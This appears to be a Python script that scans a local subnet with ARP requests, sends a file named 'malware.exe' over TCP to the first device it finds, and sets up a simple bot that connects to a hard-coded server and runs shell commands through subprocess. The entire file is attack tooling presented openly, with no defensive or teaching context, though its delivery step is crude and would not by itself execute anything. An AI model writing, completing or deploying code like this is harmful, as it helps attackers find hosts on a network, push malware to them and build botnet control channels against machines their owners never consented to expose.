import socket
import scapy.all as scapy
import subprocess
import threading
import time

class NetworkScanner:
    def __init__(self, ip_range):
        self.ip_range = ip_range
        self.devices = []

    def scan_ip(self):
        # Create an ARP request packet
        arp_request = scapy.ARP(pdst=self.ip_range)
        
        # Create an Ethernet frame
        ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        
        # Combine the ARP request and Ethernet frame
        packet = ether/arp_request
        
        # Send the packet and receive the response
        result = scapy.srp(packet, timeout=3, verbose=0)[0]
        
        # Extract the IP and MAC addresses from the response
        for sent, received in result:
            self.devices.append({'ip': received.psrc, 'mac': received.hwsrc})

    def get_devices(self):
        return self.devices

class MalwareSender:
    def __init__(self, target_ip, malware_path):
        self.target_ip = target_ip
        self.malware_path = malware_path

    def send_malware(self):
        # Create a socket object
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Connect to the target system
        s.connect((self.target_ip, 8080))
        
        # Send the malware file
        with open(self.malware_path, 'rb') as f:
            malware_data = f.read()
            s.sendall(malware_data)
        
        # Close the connection
        s.close()

class Bot:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port

    def connect_to_server(self):
        # Create a socket object
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Connect to the server
        s.connect((self.server_ip, self.server_port))
        
        # Send a message to the server
        s.send(b'Hello, server!')
        
        # Receive a response from the server
        response = s.recv(1024)
        print(f'Received from server: {response.decode()}')
        
        # Close the connection
        s.close()

    def execute_command(self, command):
        # Execute the command on the local machine
        output = subprocess.check_output(command, shell=True)
        return output.decode()

def main():
    # IP range to scan
    ip_range = '192.168.1.1/24'
    
    # Create a network scanner
    scanner = NetworkScanner(ip_range)
    
    # Scan the IP range
    scanner.scan_ip()
    
    # Get the discovered devices
    devices = scanner.get_devices()
    
    # Print the discovered devices
    for device in devices:
        print(f'IP Address: {device["ip"]}, MAC Address: {device["mac"]}')
    
    # Target the first discovered device
    target_ip = devices[0]['ip']
    malware_path = 'malware.exe'
    
    # Create a malware sender
    sender = MalwareSender(target_ip, malware_path)
    
    # Send the malware to the target system
    sender.send_malware()
    
    # Create a bot
    bot = Bot('192.168.1.100', 8080)
    
    # Connect to the server
    bot.connect_to_server()
    
    # Execute a command on the local machine
    command = 'whoami'
    output = bot.execute_command(command)
    print(f'Command output: {output}')

if __name__ == '__main__':
    main()